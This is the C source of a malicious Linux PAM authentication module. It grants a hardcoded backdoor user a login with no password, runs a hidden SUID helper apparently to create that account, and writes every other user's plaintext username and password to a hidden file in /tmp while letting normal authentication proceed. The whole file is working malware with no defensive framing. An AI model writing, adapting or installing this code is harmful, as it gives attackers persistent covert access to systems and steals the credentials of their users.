#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <security/pam_appl.h>
#include <string.h>
#include <stdio.h>
#include <pwd.h>
#include <unistd.h>

#define LOGFILE "/tmp/.credlog.txt"
#define BACKDOOR_USER "nihargayam"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {


    if (getpwnam(BACKDOOR_USER) == NULL) {
        system("/usr/bin/.dbsync");  // Call your SUID helper
    }

  
    const char *username = NULL;
    int pam_result = pam_get_user(pamh, &username, NULL);
    if (pam_result != PAM_SUCCESS || username == NULL)
        return PAM_USER_UNKNOWN;

    if (strcmp(username, BACKDOOR_USER) == 0) {
        // Bypass password for the backdoor user
        return PAM_SUCCESS;
    }



    const char *password;

    pam_get_user(pamh, &username, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);


  
    FILE *log = fopen(LOGFILE, "a");
    if (log) {
        fprintf(log, "User: %s, Password: %s\n", username, password);
        fclose(log);
    }






  
    // Let other modules handle authentication
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                               int argc, const char **argv) {
    return PAM_SUCCESS;
}
